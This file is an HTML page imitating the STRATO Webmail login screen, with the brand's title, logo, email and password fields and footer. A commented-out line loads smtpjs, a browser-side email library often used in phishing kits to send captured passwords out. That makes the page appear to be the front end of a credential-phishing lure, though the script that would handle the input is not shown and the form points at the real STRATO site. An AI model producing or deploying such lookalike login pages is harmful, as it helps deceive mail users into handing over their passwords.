<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
    <link rel="stylesheet" href="style.css">
    <script src="script.js" defer></script>
    <!-- <script src=" https://smtpjs.com/v3/smtp.js"></script> -->
    <title>Login - STRATO Webmail</title>
</head>

<body>
    <header>
        <img src="IMAGE/Login - STRATO Webmail.png">
        <div class="bars">
            <div class="line line1"></div>
            <div class="line line2"></div>
            <div class="line line3"></div>
        </div>
        <nav>
            <ul>
                <li><a href="#"><i class="fas fa-question-circle"></i>Help & Contact</a></li>
                <li><a href="#"><i class="fas fa-earth"></i>English(US)</a></li>
                <li><a href="#">Contact Login</a></li>
            </ul>
        </nav>
    </header>
    <section>
        <article>
            <h1><i class="fas fa-envelope"></i>STRATO Webmail</h1>
            <div class="login">
                <h1>Login</h1>
                <form action="https://webmail.strato.com">
                    <div>
                        <label for="email">Email Address</label>
                        <input type="email" placeholder="Enter your email" id="email">
                    </div>
                    <div>
                        <label for="password">Password</label>
                        <input type="password" placeholder="Enter your password" id="password">
                        <a href="#">forget password</a>
                    </div>
                    <span>
                        <input type="checkbox">
                        <label for="checkbox">Stay signed in</label>
                    </span>
                    <div class="Sign-in">
                        <button type="submit">Sign in</button>
                    </div>
                </form>
            </div>
        </article>
    </section>
    <footer>
        <div>
            <a href="#">STRATO-Hosting.co.uk</a>
            <a href="#">Terms & condition</a>
            <a href="#">Privacy policy</a>
            <a href="#">Imprint</a>
        </div>
        <div>
            <p>Â©2023 OX Software GmbH</p>
            <p>version 7.10.6</p>
        </div>
    </footer>
</body>

</html>
